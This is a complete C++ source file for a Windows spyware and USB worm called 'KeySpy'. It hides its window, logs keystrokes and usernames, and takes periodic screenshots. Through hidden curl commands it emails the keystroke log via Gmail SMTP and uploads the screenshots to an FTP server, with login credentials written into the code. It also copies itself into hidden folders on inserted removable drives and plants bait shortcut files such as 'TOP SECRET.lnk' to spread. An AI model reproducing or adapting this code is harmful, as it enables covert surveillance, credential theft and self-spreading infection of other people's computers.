#include <windows.h>
#include <wininet.h>
#include <time.h>
#include <string>
#include <fstream>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus")

using namespace std;

#define FILE_NAME "Record.log"
#define FOLDER_NAME "KeySpy"
#define RUN_FILE_NAME "KeySpy.exe"
#define RUN_LINK_NAME "KeySpy.lnk"
#define INFECT_FILE_NAME "Infect.exe"
#define INFECT_LINK_NAME "Infect.lnk"
#define EMAIL_SENDER_FILE_NAME "curl.exe"
#define MIN_RECORD_SIZE 20
#define LIFE_TIME 5
#define MAIL_WAIT_TIME 180000
#define MAILING_TIME 60000
#define IMAGE_CAPTURE_BREAK 2 // minutes

string allDrives; // Store all the Drive of Computer
char randomName[40];
int age = 0;
clock_t timeStart, timeToCapture;

string getFirstImageFiles();
void takeScreenShot();
int GetEncoderClsid(const WCHAR *format, CLSID *pClsid);
int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char *getRandomName();

int main()
{
    FreeConsole(); /// Hide window
    // ShowWindow( GetConsoleWindow(), SW_HIDE );
    CreateDirectory("Images", NULL);

    timeStart = clock();
    age = get_setAge();
    if (checkRecordSize())
    {
        int i = 1;
        while (i < 3)
        { /// try 2 times to send data
            Sleep(i * MAIL_WAIT_TIME);
            if (InternetCheckConnection("https://www.google.com", 1, 0))
            {
                ////////////****SEND DATA****////////////
                sendData();
                Sleep(MAILING_TIME); /// wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);
                break;
            }
            i++;
        }
    }
    age = get_setAge();

    /*LOG USER_DATE_TIME*/
    if (age <= LIFE_TIME)
    {
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); /// initial search for all disks

    while (1)
    {
        /****LOG KEY****/
        if (age <= LIFE_TIME)
        {
            logKey();
        }
        else
        {
            Sleep(5000);
        }

        /****TAKE SCREENSHOT****/
        timeToCapture = clock();
        if ((timeToCapture - timeStart) / (CLOCKS_PER_SEC * 60) > IMAGE_CAPTURE_BREAK)
        {
            takeScreenShot();
            timeStart = clock();
        }

        /// Send Images to FTP Server
        string fileImage = getFirstImageFiles();
        if (fileImage != "")
        {
            if (InternetCheckConnection("https://www.google.com", 1, 0))
            { 
                string precommand = "cmd.exe /c curl.exe -T Images/" + fileImage + " -u dongthoigian37:Trongtai37@ ftp://ftp.drivehq.com/Images/ & del Images\\" + fileImage + " & exit";
                const char *command = precommand.c_str();
                WinExec(command, SW_HIDE);
            }
        }

        /****INFECT****/
        driveLetter = getRemovableDisk();
        if (driveLetter != '0')
        {
            infectDrive(driveLetter);
        }
    }
}

/**
 * Get the name of Image sent to FTP Server
**/
string getFirstImageFiles()
{
    string search_path = "Images/*.*";
    WIN32_FIND_DATA fd;
    HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                return fd.cFileName;
            }
        } while (::FindNextFile(hFind, &fd));
        ::FindClose(hFind);
    }
    return "";
}
/**
 * For old file get age - for new file set age.
**/
int get_setAge()
{
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if (myfile.is_open())
    {
        getline(myfile, line);
        line = line.substr(0, 1); /// Lấy số đầu tiên
        sscanf(line.c_str(), "%d", &ageTemp);
    }
    else
    {
        ageTemp++;
        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }
    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize()
{
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if (myfile.is_open())
    {
        while (getline(myfile, line))
        {
            noOfLines++;
        }
        myfile.close();
    }

    if (noOfLines < MIN_RECORD_SIZE * age)
    {
        return false;
    }
    else
    {
        return true;
    }
}

/**
 * Email all data to the GHOST.
**/
void sendData()
{

    char *command = "curl smtp://smtp.gmail.com:587 -v  --mail-from \"dongthoigian377@gmail.com\" --mail-rcpt \"dongthoigian377@gmail.com\" --ssl -u dongthoigian377@gmail.com:06071997 -T \"Record.log\" -k --anyauth";
    // char* command = "curl -T $FILE_NAME -u dongthoigian37:Trongtai37@ ftp://ftp.drivehq.com/test";
    WinExec(command, SW_HIDE);
}

/**
 * Record username, time, and date.
**/
void logUserTime()
{
    FILE *file = fopen(FILE_NAME, "a");

    char username[20];
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
 * Record key stroke.
**/

void logKey()
{
    FILE *file;
    unsigned short ch = 0, i = 0, j = 0;

    while (j < 500)
    { /// loop runs for approx. 25 seconds
        ch = 1;
        while (ch < 250)
        {
            for (i = 0; i < 50; i++, ch++)
            {
                if (GetAsyncKeyState(ch) == -32767)
                { /// key is stroke
                    file = fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1); /// take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk()
{
    char drive = '0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives = "";

    for (int i = 0; i < dwResult; i++)
    {
        if (szLogicalDrives[i] > 64 && szLogicalDrives[i] < 90)
        {
            currentDrives.append(1, szLogicalDrives[i]);

            if (allDrives.find(szLogicalDrives[i]) > 100)
            {
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter)
{

    char folderPath[10] = {driveLetter};
    strcat(folderPath, ":\\");
    strcat(folderPath, FOLDER_NAME);

    if (CreateDirectory(folderPath, NULL))
    {
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[100] = {""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[100] = {""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[100] = {""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 0);

        char runlnk[100] = {""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);
        CopyFile(RUN_LINK_NAME, runlnk, 0);

        char infectlnk[100] = {""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);
        CopyFile(INFECT_LINK_NAME, infectlnk, 0);

        char hideCommand[100] = {""};
        strcat(hideCommand, "attrib +s +h +r ");
        strcat(hideCommand, folderPath);
        WinExec(hideCommand, SW_HIDE);
    }
    else
    {
        srand(time(0));
        int random = rand();

        if (random % 2 == 0 || random % 3 == 0 || random % 7 == 0)
        {
            return;
        }
    }

    char infectlnkauto[100] = {driveLetter};

    getRandomName(); // get randomName
    strcat(infectlnkauto, randomName);
    CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
}

/**
 * Returns a random name for the link file.
**/
char *getRandomName()
{

    srand(time(0));
    int random = rand();

    if (random % 8 == 0)
    {
        strcpy(randomName, ":\\DO NOT CLICK!.lnk");
    }
    else if (random % 4 == 0)
    {

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if (random % 8 == 0)
        {
            strcpy(randomName, ":\\Boss ");
            strcat(randomName, username);
            strcat(randomName, ".lnk");
        }
        else if (random % 4 == 0)
        {
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best.lnk");
        }
        else if (random % 2 == 0)
        {
            strcpy(randomName, ":\\Hello ");
            strcat(randomName, username);
            strcat(randomName, "! good morning.lnk");
        }
        else
        {
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, "! please help me.lnk");
        }
    }
    else if (random % 2 == 0)
    {
        strcpy(randomName, ":\\I will kill you ! ! !.lnk");
    }
    else if (random % 3 == 0)
    {
        strcpy(randomName, ":\\2+2=5.lnk");
    }
    else
    {
        strcpy(randomName, ":\\TOP SECRET.lnk");
    }

    return randomName;
}

/**
 * Take the Screenshot and save to folder Images
**/
void takeScreenShot()
{
    using namespace Gdiplus;
    const WCHAR *filename;
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    {
        // Get the FileName of the Image
        char user_name[20];
        unsigned long user_name_len = 20;
        GetUserName(user_name, &user_name_len);
        std::string name(user_name);
        time_t date = time(NULL);
        std::string timer(ctime(&date));
        timer = timer.substr(0, timer.size() - 1);
        std::string fileNameImage = "Images/ScreenShot_" + name + "_" + timer + ".jpeg";
        for (int i = 0; i < fileNameImage.size(); i++)
        {
            if (fileNameImage[i] == ' ' || fileNameImage[i] == ':')
                fileNameImage[i] = '_';
        }
        std::wstring w_fileNameImage(fileNameImage.begin(), fileNameImage.end());
        const WCHAR *filename = w_fileNameImage.c_str();

        // Take and Save the ScreenShot in JPEG
        HDC scrdc, memdc;
        HBITMAP membit;
        scrdc = ::GetDC(0);
        int Height = GetSystemMetrics(SM_CYSCREEN);
        int Width = GetSystemMetrics(SM_CXSCREEN);
        memdc = CreateCompatibleDC(scrdc);
        membit = CreateCompatibleBitmap(scrdc, Width, Height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
        BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
        Gdiplus::Bitmap bitmap(membit, NULL);
        CLSID clsid;
        GetEncoderClsid(L"image/jpeg", &clsid);
        bitmap.Save(filename, &clsid, NULL);
        SelectObject(memdc, hOldBitmap);
        DeleteObject(memdc);
        DeleteObject(membit);
        ::ReleaseDC(0, scrdc);
    }
    GdiplusShutdown(gdiplusToken);
}

int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    using namespace Gdiplus;
    UINT num = 0;  // number of image encoders
    UINT size = 0; // size of the image encoder array in bytes
    ImageCodecInfo *pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1; // Failure
    pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1; // Failure
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j; // Success
        }
    }
    free(pImageCodecInfo);
    return 0;
}
